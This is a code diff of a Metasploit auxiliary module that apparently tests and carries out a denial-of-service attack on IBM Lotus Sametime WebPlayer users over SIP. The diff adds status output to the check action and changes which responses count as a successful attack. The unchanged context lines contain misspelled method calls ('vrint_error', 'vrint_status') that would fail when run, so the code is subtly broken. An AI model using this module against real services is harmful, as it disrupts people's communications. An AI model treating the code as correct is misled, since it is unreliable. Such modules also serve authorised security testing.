@@ -85,7 +85,12 @@ class Metasploit3 < Msf::Auxiliary
 
     # CHECK action
     if action.name == 'CHECK'
-      check_user
+      print_status("#{peer} - Checking if user #{@sipuri} is online")
+      if check_user
+        print_status("#{peer} - User online")
+      else
+        print_status("#{peer} - User offline")
+      end
       return
     end
 
@@ -122,18 +127,21 @@ class Metasploit3 < Msf::Auxiliary
 
     if res.nil?
       vprint_good("#{peer} - User #{@sipuri} is no responding")
-      return false
+      return true
     elsif res =~ /430 Flow Failed/i
       vprint_good("#{peer} - DoS packet successful. Response received (430 Flow Failed)")
       vprint_good("#{peer} - User #{@sipuri} is no longer responding")
-      return false
+      return true
     elsif res =~ /404 Not Found/i
       vprint_error("#{peer} - DoS packet appears successful. Response received (404 Not Found)")
       vprint_status("#{peer} - User appears to be currently offline or not in a Sametime video session")
-      return false
+      return true
     elsif res =~ /200 OK/i
       vrint_error("#{peer} - DoS packet unsuccessful. Response received (200)")
       vrint_status("#{peer} - Check user is running an effected version of IBM Lotus Sametime WebPlayer")
+      return false
+    else
+      vprint_status("#{peer} - Unexpected response")
       return true
     end
   end
